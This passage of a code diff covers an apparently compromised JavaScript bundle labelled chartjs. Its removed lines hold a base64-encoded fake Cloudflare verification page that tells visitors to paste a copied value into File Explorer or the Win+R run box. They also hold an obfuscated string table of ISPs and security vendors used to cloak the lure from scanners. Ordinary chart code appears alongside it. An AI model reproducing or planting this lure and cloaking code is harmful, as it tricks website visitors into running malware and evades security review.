NDEgMTIuNTE2MSA2My40OTM3IDEzLjc1NTggNjIuOTIzMyAxNS4yNjgyTDYyLjcyMiAxNS44MDIyQzYyLjcxMzYgMTUuODI0NSA2Mi43MTA1IDE1Ljg0ODYgNjIuNzEzIDE1Ljg3MjRDNjIuNzE1NSAxNS44OTYxIDYyLjcyMzYgMTUuOTE4OSA2Mi43MzY1IDE1LjkzODlDNjIuNzQ5NSAxNS45NTg5IDYyLjc2NjkgMTUuOTc1NSA2Mi43ODc0IDE1Ljk4NzNDNjIuODA3OSAxNS45OTkxIDYyLjgzMDkgMTYuMDA1OCA2Mi44NTQ0IDE2LjAwNjhDNjIuODU2OSAxNi4wMDY4IDYyLjg1OTIgMTYuMDA2OCA2Mi44NjE4IDE2LjAwNjhINzIuNDUwMkM3Mi41MDYgMTYuMDA3MyA3Mi41NjA0IDE1Ljk4OTMgNzIuNjA1MSAxNS45NTU0QzcyLjY0OTggMTUuOTIxNiA3Mi42ODIzIDE1Ljg3MzkgNzIuNjk3NyAxNS44MTk1QzcyLjg2NzcgMTUuMjA0MyA3Mi45NTM1IDE0LjU2ODQgNzIuOTUyOSAxMy45Mjk2QzcyLjk1MTcgMTAuMDc2NyA2OS44NzMyIDYuOTUyODUgNjYuMDc1OCA2Ljk1Mjg1WiIgZmlsbD0iI0ZCQUQ0MSI+PC9wYXRoPjxwYXRoIGQ9Ik04LjExOTYzIDE4Ljg5MDRIOS43NTU0MVYyMy40MjU0SDEyLjYxMzlWMjQuODc5OEg4LjExOTYzVjE4Ljg5MDRaIiBjbGFzcz0ibG9nby10ZXh0Ij48L3BhdGg+PHBhdGggZD0iTTE0LjMwODEgMjEuOTAyM1YyMS44ODUzQzE0LjMwODEgMjAuMTY1NSAxNS42NzQgMTguNzcwNCAxNy40OTUyIDE4Ljc3MDRDMTkuMzE2NCAxOC43NzA0IDIwLjY2NTMgMjAuMTQ4MiAyMC42NjUzIDIxLjg2ODFWMjEuODg1M0MyMC42NjUzIDIzLjYwNTIgMTkuMjk5MSAyNC45OTk0IDE3LjQ3ODUgMjQuOTk5NEMxNS42NTc4IDI0Ljk5OTQgMTQuMzA4MSAyMy42MjIyIDE0LjMwODEgMjEuOTAyM1pNMTguOTk1OCAyMS45MDIzVjIxLjg4NTNDMTguOTk1OCAyMS4wMjIyIDE4LjM4MDYgMjAuMjY3OSAxNy40Nzg1IDIwLjI2NzlDMTYuNTg0NiAyMC4yNjc5IDE1Ljk4NTggMjEuMDAzOCAxNS45ODU4IDIxLjg2ODFWMjEuODg1M0MxNS45ODU4IDIyLjc0ODQgMTYuNjAxMyAyMy41MDI1IDE3LjQ5NTIgMjMuNTAyNUMxOC4zOTczIDIzLjUwMjUgMTguOTk1OCAyMi43NjY2IDE4Ljk5NTggMjEuOTAyM1oiIGNsYXNzPSJsb2dvLXRleHQiPjwvcGF0aD48cGF0aCBkPSJNMjIuNjY3NCAyMi4yNTNWMTguODkwMUgyNC4zMjg0VjIyLjIxOTFDMjQuMzI4NCAyMy4wODIyIDI0Ljc1ODQgMjMuNDkzOSAyNS40MTU5IDIzLjQ5MzlDMjYuMDczMyAyMy40OTM5IDI2LjUwMzQgMjMuMTAwMyAyNi41MDM0IDIyLjI2MTdWMTguODkwMUgyOC4xNjQ3VjIyLjIwOTNDMjguMTY0NyAyNC4xNDMyIDI3LjA3NzIgMjQuOTg5OSAyNS4zOTkxIDI0Ljk4OTlDMjMuNzIxMSAyNC45ODk5IDIyLjY2NzQgMjQuMTI2OCAyMi42Njc0IDIyLjI1MjIiIGNsYXNzPSJsb2dvLXRleHQiPjwvcGF0aD48cGF0aCBkPSJNMzAuNjY4IDE4Ljg5MDdIMzIuOTQ0NUMzNS4wNTI2IDE4Ljg5MDcgMzYuMjc1IDIwLjEyMjYgMzYuMjc1IDIxLjg1MDhWMjEuODY4NEMzNi4yNzUgMjMuNTk2MyAzNS4wMzU1IDI0Ljg4IDMyLjkxMSAyNC44OEgzMC42NjhWMTguODkwN1pNMzIuOTcgMjMuNDA3NkMzMy45NDgzIDIzLjQwNzYgMzQuNTk3IDIyLjg2MDkgMzQuNTk3IDIxLjg5MjhWMjEuODc1OUMzNC41OTcgMjAuOTE3OCAzMy45NDgzIDIwLjM2MTQgMzIuOTcgMjAuMzYxNEgzMi4zMDM4VjIzLjQwODJMMzIuOTcgMjMuNDA3NloiIGNsYXNzPSJsb2dvLXRleHQiPjwvcGF0aD48cGF0aCBkPSJNMzguNjUyNSAxOC44OTA0SDQzLjM3MzhWMjAuMzQ1M0g0MC4yODgzVjIxLjM2MzJINDMuMDc5VjIyLjc0MDdINDAuMjg4M1YyNC44Nzk4SDM4LjY1MjVWMTguODkwNFoiIGNsYXNzPSJsb2dvLXRleHQiPjwvcGF0aD48cGF0aCBkPSJNNDUuNjUgMTguODkwNEg0Ny4yODU4VjIzLjQyNTRINTAuMTQ0M1YyNC44Nzk4SDQ1LjY1VjE4Ljg5MDRaIiBjbGFzcz0ibG9nby10ZXh0Ij48L3BhdGg+PHBhdGggZD0iTTU0LjQxODcgMTguODQ3NUg1NS45OTQ5TDU4LjUwNzkgMjQuODc5N0g1Ni43NTQxTDU2LjMyMzggMjMuODEwMUg1NC4wNDdMNTMuNjI1NyAyNC44Nzk3SDUxLjkwNThMNTQuNDE4NyAxOC44NDc1Wk01NS44NTE4IDIyLjUxODNMNTUuMTk0MSAyMC44MTU0TDU0LjUyNzggMjIuNTE4M0g1NS44NTE4WiIgY2xhc3M9ImxvZ28tdGV4dCI+PC9wYXRoPjxwYXRoIGQ9Ik02MC42MTQ5IDE4Ljg5MDFINjMuNDA1NkM2NC4zMDgzIDE4Ljg5MDEgNjQuOTMxNyAxOS4xMyA2NS4zMjggMTkuNTQwNkM2NS42NzQyIDE5Ljg4MyA2NS44NTExIDIwLjM0NjIgNjUuODUxMSAyMC45MzU3VjIwLjk1MjZDNjUuODUxMSAyMS44Njc4IDY1LjM2OTEgMjIuNDc1NCA2NC42MzY5IDIyLjc5MTlMNjYuMDQ1IDI0Ljg4SDY0LjE1NThMNjIuOTY3MSAyMy4wNjU4SDYyLjI1MDdWMjQuODhINjAuNjE0OVYxOC44OTAxWk02My4zMjk5IDIxLjc2NTRDNjMuODg2NCAyMS43NjU0IDY0LjIwNzEgMjEuNDkxNSA2NC4yMDcxIDIxLjA1NTFWMjEuMDM4MUM2NC4yMDcxIDIwLjU2NzQgNjMuODY5NyAyMC4zMjggNjMuMzIxMSAyMC4zMjhINjIuMjUwN1YyMS43NjY1TDYzLjMyOTkgMjEuNzY1NFoiIGNsYXNzPSJsb2dvLXRleHQiPjwvcGF0aD48cGF0aCBkPSJNNjguMjExMiAxOC44OTA0SDcyLjk1NzhWMjAuMzAyNEg2OS44MzAyVjIxLjIwOUg3Mi42NjMyVjIyLjUxODNINjkuODMwMlYyMy40NjgzSDczVjI0Ljg3OThINjguMjExMlYxOC44OTA0WiIgY2xhc3M9ImxvZ28tdGV4dCI+PC9wYXRoPjxwYXRoIGQ9Ik00LjUzODI0IDIyLjYwNDNDNC4zMDkxOCAyMy4xMyAzLjgyNzIzIDIzLjUwMjIgMy4xODY4MSAyMy41MDIyQzIuMjkyNjUgMjMuNTAyMiAxLjY3NzQ2IDIyLjc0OTMgMS42Nzc0NiAyMS44ODUxVjIxLjg2NzhDMS42Nzc0NiAyMS4wMDQ3IDIuMjc1OTMgMjAuMjY3NiAzLjE2OTggMjAuMjY3NkMzLjg0MzY3IDIwLjI2NzYgNC4zNTY4MSAyMC42ODgyIDQuNTczNCAyMS4yNjA1SDYuMjk3NjRDNi4wMjE1MSAxOS44MzQ5IDQuNzg3MTYgMTguNzcwNyAzLjE4NjgxIDE4Ljc3MDdDMS4zNjUzMyAxOC43NzA3IDAgMjAuMTY2NiAwIDIxLjg4NTFWMjEuOTAyMUMwIDIzLjYyMTkgMS4zNDg2IDI1IDMuMTY5OCAyNUM0LjcyNzYyIDI1IDUuOTQ1MjUgMjMuOTc2NCA2LjI2NjQ1IDIyLjYwNDZMNC41MzgyNCAyMi42MDQzWiIgY2xhc3M9ImxvZ28tdGV4dCI+PC9wYXRoPjwvc3ZnPg0KICAgICA8ZGl2Pg0KICAgICAgICA8c3BhbiBzdHlsZT0idGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7Ij5Qcml2YWN5PC9zcGFuPiDigKIgPHNwYW4gc3R5bGU9InRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOyI+VGVybXM8L3NwYW4+DQogICAgIDwvZGl2Pg0KICAgICANCiAgICA8L2Rpdj4NCiAgIDwvZGl2Pg0KDQogICA8ZGl2IGlkPSJ2ZXJpZnktd2luZG93IiBjbGFzcz0idmVyaWZ5LXdpbmRvdyIgc3R5bGU9ImJvcmRlci10b3A6IG5vbmU7IHBhZGRpbmctdG9wOiAwOyBtYXJnaW4tdG9wOiAwO21hcmdpbi1ib3R0b206MDsiPg0KICAgIDxkaXYgY2xhc3M9InZlcmlmeS1jb250YWluZXIiPg0KICAgICA8bWFpbiBjbGFzcz0idmVyaWZ5LW1haW4iIHN0eWxlPSJjb2xvcjogI2Q5ZDlkOTsiPg0KICAgICANCg0KICAgICAgICAgPGRpdiBjbGFzcz0iaW5zdHJ1Y3Rpb25zIj4NCg0KICAgICAgICAgICAgICA8cCBzdHlsZT0iZm9udC1zaXplOiAxOHB4OyBtYXJnaW4tYm90dG9tOiAxNXB4OyI+DQogICAgVG8gYWNjZXNzIDxzdHJvbmc+PHNwYW4gY2xhc3M9ImRvbWFpbi1uYW1lIj48L3NwYW4+PC9zdHJvbmc+LCBmb2xsb3cgdGhlc2Ugc3RlcHM6DQogICAgICA8L3A+DQoNCg0KICAgIA0KICAgICAgPG9sPg0KICAgICAgICA8IS0tIC4uLi4uLi48bGkgc3R5bGU9Im1hcmdpbi1ib3R0b206IDEwcHg7Ij4NCiAgICAgICAgICBDb3B5IHRoZSBmaWxlIHBhdGggYmVsb3cNCiAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2RlLWJsb2NrIiBpZD0icGF0aCIgb25jbGljaz0idGhpcy5jbGFzc0xpc3QuYWRkKCdjbGlja2VkJykiPg0KICAgICAgICAgICAgQzpcaW50ZXJuYWwtc2VjdXJlXGZpbGVkcml2ZVxIUlBvbGljeS5kb2N4DQogICAgICAgICAgPC9kaXY+DQogICAgICAgIDwvbGk+IDs7Ozs7OzstLT4NCiAgICAgICAgPGxpIHN0eWxlPSJtYXJnaW4tYm90dG9tOiAxMHB4OyI+T3BlbiBGaWxlIEV4cGxvcmVyIGFuZCBzZWxlY3QgdGhlIGFkZHJlc3MgYmFyICg8c3Ryb25nPkNUUkwgKyBMPC9zdHJvbmc+KTwvbGk+DQogICAgICAgIDxsaSBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMTBweDsiPlBhc3RlIHRoZSBwYXRoICg8c3Ryb25nPkNUUkwgKyBWPC9zdHJvbmc+KSBhbmQgcHJlc3MgPHN0cm9uZz5FbnRlcjwvc3Ryb25nPjwvbGk+DQogICAgICA8L29sPg0KICAgIDwvZGl2Pg0KDQogICAgIDxpbnB1dCB0eXBlPSJmaWxlIiBpZD0iZmlsZUlucHV0IiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPg0KICAgIDxidXR0b24gaWQ9ImZpbGVFeHBsb3JlciI+T3BlbiBGaWxlIEV4cGxvcmVyPC9idXR0b24+DQoNCg0KICAgPCEtLSAgIDxwIHN0eWxlPSJmb250LXNpemU6IDE4cHg7IG1hcmdpbi1ib3R0b206IDE1cHg7Ij4NCiAgICAgICBUbyBiZXR0ZXIgcHJvdmUgeW91IGFyZSBub3QgYSByb2JvdCwgcGxlYXNlOg0KICAgICAgPC9wPg0KICAgICAgPG9sPg0KICAgICAgIDxsaT5QcmVzcyAmYW1wOyBob2xkIHRoZSBXaW5kb3dzIEtleSA8aSBjbGFzcz0iZmFiIGZhLXdpbmRvd3MiPjwvaT4gKyA8Yj5SPC9iPi48L2xpPg0KDQogICAgICAgPGxpPkluIHRoZSB2ZXJpZmljYXRpb24gd2luZG93LCBwcmVzcyA8Yj5DdHJsPC9iPiArIDxiPlY8L2I+LjwvbGk+DQoNCiAgICAgICA8bGk+UHJlc3MgPGI+RW50ZXI8L2I+IG9uIHlvdXIga2V5Ym9hcmQgdG8gZmluaXNoLjwvbGk+DQogICAgICA8L29sPg0KICAgICAgPHAgc3R5bGU9InBhZGRpbmctdG9wOiAxMHB4OyI+DQogICAgICAgWW91IHdpbGwgb2JzZXJ2ZSBhbmQgYWdyZWU6DQogICAgICAgPGJyIC8+DQogICAgICAgPGNvZGUgc3R5bGU9ImJhY2tncm91bmQ6IG5vbmU7IGJvcmRlcjogMXB4IHNvbGlkICM3OTc5Nzk7IHdpZHRoOiA0MzJweDsiPiDinIUgIkkgYW0gbm90IGEgcm9ib3QgLSByZUNBUFRDSEEgVmVyaWZpY2F0aW9uIElEOiA8c3BhbiBpZD0idmVyaWZpY2F0aW9uLWlkIj4xNDY4MjA8L3NwYW4+IiA8L2NvZGU+DQogICAgICA8L3A+DQogICAgIDwvbWFpbj4tLT4NCg0KDQogICAgPC9kaXY+DQogICA8IS0tIDxkaXYgY2xhc3M9InZlcmlmeS1jb250YWluZXIgdmVyaWZ5LWZvb3RlciIgc3R5bGU9ImJhY2tncm91bmQ6IG5vbmU7Ij4NCiAgICAgPGRpdiBjbGFzcz0idmVyaWZ5LWZvb3Rlci1sZWZ0IiBzdHlsZT0id2lkdGg6IDI4NnB4OyBmbG9hdDogbGVmdDsgdGV4dC1hbGlnbjogbGVmdDsgZm9udC1zaXplOiAxNXB4OyI+DQogICAgICBQZXJmb3JtIHRoZSBzdGVwcyBhYm92ZSB0byBmaW5pc2ggdmVyaWZpY2F0aW9uLg0KICAgICA8L2Rpdj4NCiAgICAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJ2ZXJpZnktdmVyaWZ5LWJ1dHRvbiBibG9jayIgaWQ9InZlcmlmeS1idXR0b24iIHN0eWxlPSJiYWNrZ3JvdW5kOiAjNWU1ZTVlOyBwYWRkaW5nOiA5cHggMzhweDsiPlZlcmlmeTwvYnV0dG9uPg0KICAgIDwvZGl2PiAtLT4NCiAgIDwvZGl2Pg0KDQogICA8IS0tIC0tPg0KDQogICA8c2NyaXB0Pg0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsIGZ1bmN0aW9uICgpIHsNCiAgICBjb25zdCBkb21haW4gPSB3aW5kb3cubG9jYXRpb24uaG9zdG5hbWU7DQogICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgiLmRvbWFpbiIpLmZvckVhY2goZWwgPT4gew0KICAgICAgICBpZiAoZWwpIGVsLnRleHRDb250ZW50ID0gZG9tYWluOw0KICAgIH0pOw0KfSk7DQo8L3NjcmlwdD4NCg0KICA8L2Rpdj4NCiAgICA8cCBzdHlsZT0iZm9udC1zaXplOiAxLjVyZW07DQogICAgbGluZS1oZWlnaHQ6IDIuMjVyZW07IHBhZGRpbmctdG9wOiAyMHB4OyI+PHNwYW4gY2xhc3M9ImRvbWFpbi1uYW1lIj48L3NwYW4+IG5lZWRzIHRvIHJldmlldyB0aGUgc2VjdXJpdHkgb2YgeW91ciBjb25uZWN0aW9uIGJlZm9yZSBwcm9jZWVkaW5nLjwvcD4NCiA8L2Rpdj4NCiANCiA8ZGl2IGNsYXNzPSJmb290ZXIiIHJvbGU9ImNvbnRlbnRpbmZvIj4NCiAgPGRpdiBjbGFzcz0iZm9vdGVyLWlubmVyIj4NCiAgIDxkaXY+DQogICAgPGRpdj5SYXkgSUQ6IDxjb2RlIGNsYXNzPSJyYXktaWQiPjU2YTRjNTI5OWZkZXRtY2E8L2NvZGU+PC9kaXY+DQogICA8L2Rpdj4NCiAgIDxkaXYgc3R5bGU9Im1hcmdpbi10b3A6IDVweDsiPlBlcmZvcm1hbmNlICYgc2VjdXJpdHkgYnkgPHNwYW4gY2xhc3M9ImNsb3VkZmxhcmUtbG9nbyI+Q2xvdWRmbGFyZTwvc3Bhbj48L2Rpdj4NCiAgPC9kaXY+DQogPC9kaXY+DQo8L2Rpdj4NCg0KDQoNCg0KPHNjcmlwdD4NCg0KDQoNCjwvc2NyaXB0Pg0KDQoNCjwvYm9keT48L2h0bWw+',
-        'rBmow',
-        'Tirmb',
-        'hYchT',
-        'fwQrR',
-        'Zayo\x20Group\x20EU\x20Limited',
-        'GmuEr',
-        'Lbufl',
-        'Capris\x20Group',
-        'PulsePoint\x20Communications',
-        'mobile',
-        'IVuyK',
-        'Incero\x20LLC',
-        'ThePlanet.com\x20Internet\x20Services',
-        'pCMKO',
-        'getParameter',
-        'pDiVg',
-        'DtRHc',
-        'Trend\x20Micro\x20Incorporated',
-        'Yahoo\x20Japan\x20Corporation',
-        'AacDG',
-        'Multimedia\x20Polska\x20S.A.',
-        'replace',
-        'LeaseWeb\x20Netherlands\x20B.V.',
-        'Kaspersky\x20Lab\x20AO',
-        'runtime',
-        'Internap\x20Network\x20Services\x20Corporation',
-        'Websense',
-        'Microsoft\x20(China)\x20Co.',
-        'rezsh',
-        'Packethub',
-        'GpQKv',
-        'BJrTw',
-        'AZHVf',
-        'eoijW',
-        '255872VZndpw',
-        'toUTCString',
-        'wGdWu',
-        'Google\x20Cloud',
-        'Barracuda\x20Canada',
-        'yahoo',
-        'CvYIY',
-        'bot',
-        'Amazon.com\x20Tech\x20Telecom',
-        'PVXwz',
-        'MTO\x20Telecom',
-        'RlIZd',
-        'WyHEX',
-        'fsLYD',
-        'Blocked\x20ISP\x20detected:',
-        'vTTTD',
-        'vAtLD',
-        'crawl',
-        'Leaseweb',
-        'cEjwG',
-        'MBddn',
-        'IrVQQ',
-        'InterNAP\x20Network\x20Services\x20U.K.\x20Limited'
-    ];
-    a = function () {
-        return a9;
-    };
-    return a();
-}/* >>> chartjs (36878 bytes) <<< */
-(function(){
-try{
-/*global module:true*/
-'use strict';
-
-Math.log2 = Math.log2 || function(x) {
-  return Math.log(x) / Math.LN2;
 };
+}catch(e){}
+})();
 
-Math.log10 = Math.log10 || function(x) {
-  return Math.log(x) / Math.LN10;
-};
 
-(function() {
-  var Helpers = {
-    avg: function(arr) {
-      var v = 0;
-      for (var index = 0; index < arr.length; ++index) {
-        v += arr[index];
-      }
-      return v / arr.length;
-    },
-    min: function(arr) {
-      if (arr.length === 0) return 0;
-      var v = arr[0];
-      for (var index = 1; index < arr.length; ++index) {
-        var v2 = arr[index];
-        if (Array.isArray(v2)) v2 = Helpers.avg(v2);
-        if (v2 < v) v = v2;
-      }
-      return Math.max(0, v);
-    },
-    max: function(arr) {
-      var v = 0;
-      for (var index = 0; index < arr.length; ++index) {
-        var v2 = arr[index];
-        if (Array.isArray(v2)) v2 = Helpers.avg(v2);
-        if (v2 > v) v = v2;
-      }
-      return Math.max(0, v);
-    },
-    upperMax: function(arr) {
-      var v = 0;
-      for (var index = 0; index < arr.length; ++index) {
-        var v2 = arr[index];
-        if (Array.isArray(v2)) v2 = Helpers.max(v2);
-        if (v2 > v) v = v2;
-      }
-      return Math.max(0, v);
-    },
-    lowerMin: function(arr) {
-      if (arr.length === 0) return 0;
-      var v = arr[0] || Infinity;
-      if (Array.isArray(v)) v = Helpers.lowerMin(v);
-      for (var index = 1; index < arr.length; ++index) {
-        var v2 = arr[index];
-        if (v2 == null) continue;
-        if (Array.isArray(v2)) v2 = Helpers.lowerMin(v2);
-        if (v2 < v) v = v2;
-      }
-      if (isNaN(v) || !isFinite(v)) v = 0;
-      return Math.max(0, v);
-    },
-    niceNumbers: function(range, round) {
-      var exponent = Math.floor(Math.log10(range));
-      var fraction = range / Math.pow(10, exponent);
-      var niceFraction;
-      if (round) {
-        if (fraction < 1.5) niceFraction = 1;
-        else if (fraction < 3) niceFraction = 2;
-        else if (fraction < 7) niceFraction = 5;
-        else niceFraction = 10;
-      } else {
-        if (fraction <= 1.0) niceFraction = 1;
-        else if (fraction <= 2) niceFraction = 2;
-        else if (fraction <= 5) niceFraction = 5;
-        else niceFraction = 10;
-      }
-      return niceFraction * Math.pow(10, exponent);
-    },
-    getLinearTicks: function(min, max, maxTicks) {
-      var range = Helpers.niceNumbers(max - min, false);
-      var tickSpacing = Helpers.niceNumbers(range / (maxTicks - 1), true);
-      return [
-        Math.floor(min / tickSpacing) * tickSpacing,
-        Math.ceil(max / tickSpacing) * tickSpacing,
-        tickSpacing
-      ];
-    },
-    getFont: function(options) {
-      options.style = options.style || 'normal';
-      options.variant = options.variant || 'normal';
-      options.weight = options.weight || 'lighter';
-      options.size = options.size || '12';
-      options.family = options.family || 'Arial';
-      return [options.style, options.variant, options.weight, options.size + 'px', options.family].join(' ');
-    },
-    getAxisRatio: function(min, max, value) {
-      return (value - min) / (max - min);
+  function hasLocalStorage() {
+    try {
+      const t = '__vc_test';
+      localStorage.setItem(t, '1');
+      localStorage.removeItem(t);
+      return true;
+    } catch (err) {
+      return false;
     }
-  };
-
-  var BarChart = (function() {
-    function BarChart(ctx, options) {
-      this.mouseListeners = [];
-      this.currentHint = null;
-      this.fillRegions = []
-      this.options = {
-        font: 'Helvetica',
-        fontWeight: 'normal',
-        fontSizeTitle: 24,
-        fontSizeAxes: 20,
-        fontSizeTicks: 18,
-        fontSizeLabels: 18,
-        fontDataTags: 18,
-        fontSizeLegend: 18,
-        fontSizeHint: 18,
-        paddingPercentBars: 0.10,
-        paddingPercentTicks: 0.15,
-        paddingPixelsVertical: 10,
-        paddingPixelsHorizontal: 10,
-        paddingPixelsTicks: 10,
-        maxWidthBars: 0,
-        fillColorBackground: 'rgb(255, 255, 255)',
-        strokeColorBars: 'rgb(0, 0, 0)',
-        fillColorBars: 'rgba(180, 180, 180, 0.25)',
-        scaleStyle: 'linear',
-        barStyle: 'none',
-        stackedBarPadding: 3,
-        defaultMaxTick: 0,
-        pixelsLegendSquare: 10,
-        radiusDot: 5,
-        fillColorLegend: 'rgb(230, 230, 230)',
-        tickFormatter: null,
-        tickFormatterMeasure: null,
-        fillRegion: 'normal'
-      };
-      options = options || { };
-      for (var key in this.options) {
-        if (options.hasOwnProperty(key)) this.options[key] = options[key];
-      }
-      this.ctx = ctx;
-      this.content = { };
-      this.labelPositions = { }
-    }
-
-    BarChart.prototype.update = function(content) {
-      if (typeof content !== 'object') {
-        throw new Error('Collections must be objects.');
-      } else if (!(content.hasOwnProperty('labels') && content.hasOwnProperty('data'))) {
-        throw new Error('Collection must specify labels and data.');
-      } else if (!(Array.isArray(content.labels) && Array.isArray(content.data))) {
-        throw new Error('Labels and data must be arrays.');
-      } else if (content.labels.length !== content.data.length) {
-        throw new Error('Labels and data length must match.');
-      }
-      content._data_standard_deviation = [];
-      content._data_standard_error = [];
-      for (var i = 0; i < content.data.length; ++i) {
-        var isArr = Array.isArray(content.data[i]);
-        if (this.options.scaleStyle === 'log2') {
-          if (isArr) {
-            for (var i3 = 0; i3 < content.data[i].length; ++i3) content.data[i][i3] = Math.log2(content.data[i][i3]);
-          } else content.data[i] = Math.log2(content.data[i]);
-        }
-        if (isArr) {
-          var mean = Helpers.avg(content.data[i]);
-          var acc = 0;
-          for (var i2 = 0; i2 < content.data[i].length; ++i2) acc += Math.pow(mean - content.data[i][i2], 2);
-          acc = Math.sqrt(acc / (content.data[i].length - 1));
-          content._data_standard_deviation.push(acc);
-          content._data_standard_error.push(acc / Math.sqrt(content.data[i].length));
-        } else {
-          content._data_standard_deviation.push(0);
-          content._data_standard_error.push(0);
-        }
-      }
-      this.content = content;
-      this.redraw();
-    };
-
-    BarChart.prototype.redraw = function() {
-      setTimeout(function() {
-        this._draw();
-      }.bind(this), 0);
-    };
-
-    BarChart.prototype.mousemove = function(x, y) {
-      var res = null;
-      for (var index = 0; index < this.mouseListeners.length; ++index) {
-        if ((res = this.mouseListeners[index](x, y))) break;
-      }
-      if (!res || (typeof res) !== 'object' || !res.hasOwnProperty('index') || !res.hasOwnProperty('drawIndex')) {
-        if (this.currentHint !== null) {
-          this.currentHint = null;
-          this.redraw();
-        }
-        return;
-      }
-      var ch = this.currentHint;
-      if (ch == null || ch.index != res.index || ch.drawIndex != res.drawIndex) {
-        this.currentHint = res;
-        this.redraw();
-      }
-    };
-
-    BarChart.prototype._draw = function() {
-      var labelPositions = { }
-      this.mouseListeners = [];
-      this.fillRegions = [];
-
-      var options = this.options;
-      var ctx = this.ctx, content = this.content;
-      var width = ctx.canvas.width, height = ctx.canvas.height;
-      ctx.clearRect(0, 0, width, height);
-      ctx.translate(-0.5, -0.5);
-      var remainingWidth = width, remainingHeight = height;
-      var index;
-
-      if (options.fillColorBackground != null) {
-        ctx.save();
-        ctx.fillStyle = options.fillColorBackground;
-        ctx.fillRect(0, 0, width, height);
-        ctx.restore();
-      }
-
-      var topYPadding = options.paddingPixelsHorizontal;
-      remainingHeight -= options.paddingPixelsHorizontal;
-      ctx.fillStyle = 'rgb(0, 0, 0)';
-      /* Draw title of bar chart */
-      if (content.title != null) {
-        ctx.save();
-        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeTitle, family: options.font });
-        ctx.textAlign = 'center';
-        ctx.fillText(content.title, width / 2, topYPadding + options.fontSizeTitle);
-        ctx.restore();
-        remainingHeight -= options.fontSizeTitle * 1.25;
-        topYPadding += options.fontSizeTitle * 1.25;
-      }
-
-      /* Compute required left padding */
-      var leftXPadding = options.paddingPixelsVertical;
-      remainingWidth  -= options.paddingPixelsVertical;
-
-      var leftXDrawYLabel = null;
-      if (content.yAxis != null) {
-        leftXDrawYLabel = leftXPadding + options.fontSizeAxes * 0.5;
-        remainingWidth -= options.fontSizeAxes * 1.25;
-        leftXPadding += options.fontSizeAxes * 1.25;
-      }
-
-      ctx.save();
-      ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeTicks, family: options.font });
-      var maxChartValue, minChartValue;
-      if (options.barStyle === 'stacked') {
-        maxChartValue = 0;
-        minChartValue = Infinity;
-        for (var cmIndex = 0; cmIndex < content.data.length; ++cmIndex) {
-          var doB;
-          if (Array.isArray(doB = content.data[cmIndex])) {
-            var tempSum = 0;
-            for (var ii2 = 0; ii2 < doB.length; ++ii2) tempSum += doB[ii2];
-            maxChartValue = Math.max(maxChartValue, tempSum);
-            minChartValue = Math.min(minChartValue, tempSum);
-          } else {
-            maxChartValue = Math.max(maxChartValue, content.data[cmIndex]);
-            minChartValue = Math.min(minChartValue, content.data[cmIndex]);
-          }
-        }
-      } else {
-        maxChartValue = Helpers.upperMax(content.data);
-        minChartValue = Helpers.lowerMin(content.data);
-      }
-      if (options.scaleStyle.indexOf('adaptive') === 0) {
-        if (options.scaleStyle.indexOf(':') !== -1) {
-          var floater = parseFloat(options.scaleStyle.split(/[:]/)[1]);
-          minChartValue *= floater;
-          maxChartValue *= 1 + (1 - floater) / 2.0;
-        }
-      } else minChartValue = 0;
-      if (options.defaultMaxTick > maxChartValue) maxChartValue = options.defaultMaxTick;
-      if (content.bars != null && Array.isArray(content.bars)) {
-        for (index = 0; index < content.bars.length; ++index) {
-          var cbv = content.bars[index].value;
-          if (isNaN(cbv)) continue;
-          maxChartValue = Math.max(maxChartValue, cbv);
-          minChartValue = Math.min(minChartValue, cbv);
-        }
-      }
-      var maxYAxisTickWidth = options.scaleStyle == 'log2' ? Math.ceil(Math.pow(2, maxChartValue)) : (Math.ceil(maxChartValue) + '.00');
-      if (options.tickFormatterMeasure != null) maxYAxisTickWidth = options.tickFormatterMeasure;
-      maxYAxisTickWidth = ctx.measureText(maxYAxisTickWidth).width;
-      maxYAxisTickWidth = Math.ceil(maxYAxisTickWidth) + options.paddingPixelsTicks;
-      remainingWidth -= maxYAxisTickWidth;
-      leftXPadding += maxYAxisTickWidth;
-      ctx.restore();
-
-      var rightXPadding = options.paddingPixelsVertical;
-      remainingWidth -= options.paddingPixelsVertical;
-
-      /* Draw legend */
-      if (content.legend != null && Array.isArray(content.legend)) {
-        ctx.save();
-        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLegend, family: options.font });
-        var maxLWidth = 0;
-        for (var lIndex = 0; lIndex < content.legend.length; ++lIndex) {
-          maxLWidth = Math.max(maxLWidth, ctx.measureText(content.legend[lIndex].label).width);
-        }
-        maxLWidth = Math.ceil(maxLWidth);
-        maxLWidth += options.pixelsLegendSquare + 8;
-        var legendEntriesPerLine = Math.floor((remainingWidth - options.paddingPixelsHorizontal * 2) / maxLWidth);
-        var lLReqHeight = Math.ceil(content.legend.length / legendEntriesPerLine) * options.fontSizeLegend * 1.5;
-        remainingHeight -= lLReqHeight;
-        bottomYPadding += lLReqHeight;
-
-        ctx.strokeStyle = 'rgb(0, 0, 0)';
-        ctx.fillStyle = options.fillColorLegend;
-        var bSX, bSY;
-        ctx.beginPath();
-        ctx.moveTo(bSX = leftXPadding, bSY = topYPadding + remainingHeight);
-        ctx.lineTo(bSX + remainingWidth, bSY);
-        ctx.lineTo(bSX + remainingWidth, bSY + lLReqHeight);
-        ctx.lineTo(bSX, bSY + lLReqHeight);
-        ctx.lineTo(bSX, bSY);
-        ctx.stroke();
-        ctx.fill();
-
-        for (lIndex = 0; lIndex < content.legend.length; ++lIndex) {
-          var legLine = Math.floor(lIndex / legendEntriesPerLine);
-          var legCol = lIndex % legendEntriesPerLine;
-          ctx.fillStyle = content.legend[lIndex].color;
-          var boxX = bSX + legCol * maxLWidth + 3, boxY = bSY + legLine * options.fontSizeLegend * 1.5 + options.fontSizeLegend * 0.5;
-          ctx.beginPath();
-          ctx.moveTo(boxX, boxY);
-          ctx.lineTo(boxX + options.pixelsLegendSquare, boxY);
-          ctx.lineTo(boxX + options.pixelsLegendSquare, boxY + options.pixelsLegendSquare);
